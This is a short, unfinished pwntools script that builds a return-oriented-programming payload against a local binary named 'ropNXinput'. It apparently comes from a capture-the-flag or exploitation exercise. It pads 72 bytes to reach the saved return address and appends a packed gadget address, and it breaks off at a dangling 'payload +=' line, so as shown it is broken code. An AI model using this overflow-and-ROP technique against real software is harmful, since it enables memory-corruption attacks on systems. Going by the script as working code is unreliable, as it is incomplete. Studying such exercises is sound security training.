from pwn import *

p = process('./ropNXinput')
elf = ELF('./ropNXinput')

offset = 72

pr = 0x0000000000000853

payload = ""
payload += "A"*72
payload += p64(pr)
payload +=